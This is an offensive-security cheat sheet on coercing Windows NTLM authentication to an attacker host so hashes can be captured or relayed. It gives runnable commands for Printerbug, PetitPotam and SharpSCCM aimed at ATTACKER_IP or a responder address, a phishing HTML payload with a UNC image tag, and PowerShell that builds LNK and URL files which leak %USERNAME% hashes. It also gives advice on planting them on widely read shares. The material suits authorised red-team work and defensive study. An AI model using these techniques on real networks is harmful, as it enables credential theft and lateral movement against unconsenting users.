# Trigger Incoming SMB Connections
## Printerbug
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py   

Simple tool to trigger SpoolService bug via RPC backconnect. Similar to dementor.py.    
`# python3 printerbug.py domain/USER:password@target.domain.local ATTACKER_IP`   
 
### Using SpoolSample
The Printerbug can also be triggered from Windows using the "SpoolSample" tool: https://github.com/leechristensen/SpoolSample   

**Check Spooler Remotely**   
To check if the spooler is active on the remote target, there are different methods:   
- For DCs, you can use PingCastle   
- For manually checking a specific target with PowerShell, use: https://raw.githubusercontent.com/vletoux/SpoolerScanner/master/SpoolerScan.ps1
- For manually checking a specific target with Python, use: https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py

## Word Document with Remote Template

In a Word document you can use the target property for a Word Template to insert UNC paths.
1. Create new docx file from a template (choose any built in template, e.g. “Business Letter”)
2. Save the docx and open it with the vim editor
3. Open the containing file `word/_rels/settings.xml.rels`  
4. Change the value of the Target property, so that it points to your listening instance (e.g. Responder) using a UNC path.
5. Save the file and send / provide it to your victim. Once the victim opens the document, the connection is triggered by Word (you should receive the NetNTLMv2 hash of the logged in user)

## PetitPotam
https://github.com/topotam/PetitPotam   
PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw function.
It doesn't need credentials against Domain Controller.

`# python3 PetitPotam.py -d 'domain' -u 'user' -p 'password' ATTACKER_IP TARGET`   

## Phishing email with <img> tag
Payload template
```
<html>
<body>
<img src="\\<ATTACKER VM>\someicon.ico" height="1" width="1" />
</body>
</html>
```

**Outlook**   
For some reason outlook only allows to embed an HTML file if it is attached through the quick access bar.
First you need to show the quick access toolbar, then customize the quick access toolbar by adding the command "Attach File" (More Commands...).
You can then attach the HTML payload to your email (Make sure you click on the dropdown and "Insert as Text")

## Shortcut (LNK Files)
Trigger SMB connection using a shortcut, by setting its icon location to a UNC path (e.g. kali running Responder):   
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\computername\software\test.lnk")
$shortcut.IconLocation = "\\10.10.10.1\test.ico"
$shortcut.Save()
```
A good location for such a file would be a central SMB share where many people have read access. (Or a share where the IT admins are regularly connecting to...)

## URL Files
Same as with .lnk files, Internet Shortcuts (.url files) can be used.   
url file example:   
```shell
# cat newshortcut.url
[InternetShortcut]
URL=test
WorkingDirectory=test
IconFile=\\<responder-ip>\harvest\%USERNAME%.icon
IconIndex=1
```
Using PowerShell:   
```powershell
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("c:\users\bob\test\newshortcut.url")
$shortcut.TargetPath = "https://somewebsite"
$shortcut.save()
Add-Content -Path $shortcut.FullName -Value "IconFile=\\<responder-ip>\harvest\%USERNAME%.icon"
Add-Content -Path $shortcut.FullName -Value "IconIndex=1"
```
 
Now find for example a writeable SMB share where you can drop this file and copy the url file to it. (Remember to start Responder on your attacker host)   

Example using smbmap:   
`python3 smbmap.py -u username -p 'secret' -d domain -H <ip of host of smb share> --upload /path/to/your/urlfile 'sharename/newshortcut.url'`   
Now, once someone browses to this share, you should see hashes popping up in your Responder instance.

## MSSQL
If you happen to find an MSSQL instance where you have access (using PowerUpSQL) and you can run either 'xp_fileexist' or 'xp_dirtree', you can try to use those to trigger an authenticated ntlm connection from the SQL service account to e.g. your responder instance.

## SCCM
If you are on a SCCM managed device with a low privileged user, you can force the SCCM service to authenticate.   
Full blog post by SpecterOps: https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a    

**Prerequisites**   
In order for this to work, the configuration of the SCCM has to be set to:   
- Enable automatic site-wide client push installation
- PKI certificates aren't required for client authentication
- Allow connection fallback to NTLM (Which is the default as of Januar 2023 → [Deploy clients to Windows - Configuration Manager ](https://learn.microsoft.com/en-us/mem/configmgr/core/clients/deploy/deploy-clients-to-windows-computers#configure-the-site-to-automatically-use-client-push-for-discovered-computers))

**Exploitation**   
First identify the SCCM siteinfo which provides us with the sitecode, using e.g. the tool "SharpSCCM" ([GitHub - Mayyhem/SharpSCCM: A C# utility for interacting with SCCM](https://github.com/Mayyhem/SharpSCCM) ).

`SharpSCCM.exe local siteinfo`   
Example output: (sitecode is ROO)   
```shell
[ ... ] 
SMS_Authority
--------------------
CurrentManagementPoint: SCCM.domain.local
Name: SMS:ROO
[ ... ]
```
Trigger the connection towards your Responder instance (in the following example, Responder is running on 10.10.10.1):   
`SharpSCCM.exe SCCM.domain.local ROO invoke client-push -t 10.10.10.1`   
After about 10 seconds you should receive two NTLM hashes:   
- The NTLM hash for the SCCM service account
- The NTLM hash of the SCCM machine account (indicated by the $ after the name)

## ADCS 
Certain ADCS vulnerabilities like ESC8 and ESC11 can be used in NTLM relaying attacks.   
Tools like SpoolSample or Dementor can be for example used to coerce a machine account to connect to the attacker machine, which then the attacker can use to enroll certificates in the victim machines name.
Another method used in the ESC11 vulnerability is to relay using the RPC interface of the certificate authority, which is described in the following blog post:   
https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/   
To identify the ESC11 vulnerability, the following fork of the certipy tool has to be used: https://github.com/sploutchy/Certipy

## WebDAV
WebDAV is a file server over HTTP. The service WebClient is present on workstations by default (Not on server OS). This produces an HTTP hash which can be relayed to LDAP.

**Prerequisites**   
- Requires the system’s NetBIOS name
- Must be in the "local intranet" zone 
- Requires DNS record
  - Either poisoned in the local subnet using Responder
  - Create a DNS A record pointing to an external IP (Check ADIDNS --> https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing or https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
